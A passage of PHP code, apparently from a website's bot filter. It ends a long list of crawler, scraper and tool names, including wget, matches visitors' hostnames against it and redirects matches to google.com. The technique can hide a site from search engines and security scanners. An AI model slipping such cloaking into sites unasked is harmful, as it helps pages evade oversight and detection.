		"skymob.com",
		"sleek",
		"smartwit",
		"sna-",
		"snappy",
		"snooper",
		"sohu",
		"speedfind",
		"sphere",
		"sphider",
		"spinner",
		"spyder",
		"steeler/",
		"suke",
		"suntek",
		"supersnooper",
		"surfnomore",
		"sven",
		"sygol",
		"szukacz",
		"tach black widow",
		"tarantula",
		"templeton",
		"/teoma",
		"t-h-u-n-d-e-r-s-t-o-n-e",
		"theophrastus",
		"titan",
		"titin",
		"tkwww",
		"toutatis",
		"t-rex",
		"tutorgig",
		"twiceler",
		"twisted",
		"ucsd",
		"udmsearch",
		"url check",
		"updated",
		"vagabondo",
		"valkyrie",
		"verticrawl",
		"victoria",
		"vision-search",
		"volcano",
		"voyager/",
		"voyager-hc",
		"w3c_validator",
		"w3m2",
		"w3mir",
		"walker",
		"wallpaper",
		"wanderer",
		"wauuu",
		"wavefire",
		"web core",
		"web hopper",
		"web wombat",
		"webbandit",
		"webcatcher",
		"webcopy",
		"webfoot",
		"weblayers",
		"weblinker",
		"weblog monitor",
		"webmirror",
		"webmonkey",
		"webquest",
		"webreaper",
		"websitepulse",
		"websnarf",
		"webstolperer",
		"webvac",
		"webwalk",
		"webwatch",
		"webwombat",
		"webzinger",
		"wget",
		"whizbang",
		"whowhere",
		"wild ferret",
		"worldlight",
		"wwwc",
		"wwwster",
		"xenu",
		"xift",
		"xirq",
		"yandex",
		"yanga",
		"yeti",
		"yahoo!",
	);
foreach ($blocked_words as $word) {
	if (substr_count($hostname, $word) > 0) {
		$status = "BLOQUEADO";
	}
}

if ($status == "BLOQUEADO") {
	http_response_code(301);
	header("HTTP/1.1 301 Moved Permanently");
	header("Location: http://www.google.com/");
	exit;
}
